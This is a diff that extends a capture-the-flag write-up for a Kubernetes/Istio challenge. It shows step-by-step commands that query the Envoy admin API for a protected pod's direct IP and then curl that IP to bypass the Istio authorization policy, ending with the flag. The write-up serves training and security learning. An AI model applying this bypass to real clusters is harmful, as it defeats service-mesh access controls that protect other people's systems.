@@ -4,7 +4,7 @@ tags:
   - Istio
   - Service-Mesh
 title: K8S LAN Party - The Beauty and The Ist
-description: 
+description: Bypass Istio envoy sidecar for ignoring the authorization policy
 reference: https://k8slanparty.com/challenge/4
 ---
 ## Challenge
@@ -170,4 +170,50 @@ root@wiz-k8s-lan-party:~# curl -vvv -X PUT 10.100.224.159
     </body>
 </html>
 * Connection #0 to host 10.100.224.159 left intact
+```
+
+### 9. find the local IP of `istiod-protected-service` to bypass the envoy proxy by Istio Admin REST API
+
+IP is `192.168.47.181:80`
+
+```
+root@wiz-k8s-lan-party:~# curl http://localhost:15000/clusters | grep istio-protected    
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::observability_name::outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_connections::4294967295
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_pending_requests::4294967295
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_requests::4294967295
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_retries::4294967295
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_connections::1024
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_pending_requests::1024
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_requests::1024
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_retries::3
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::added_via_api::true
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::eds_service_name::outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_active::0
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_connect_fail::0
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_total::4
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_active::0
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_error::3
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_success::4
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_timeout::0
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_total::7
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::hostname::
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::health_flags::healthy
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::weight::1
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::region::us-west-1
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::zone::us-west-1c
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::sub_zone::
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::canary::false
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::priority::0
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::success_rate::-1
+outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::local_origin_success_rate::-1
+```
+
+### 10. Try to `curl 192.168.47.181:80`
+
+```
+root@wiz-k8s-lan-party:~# curl 192.168.47.181:80
+wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}root@wiz-k8s-lan-party:~#
 ```
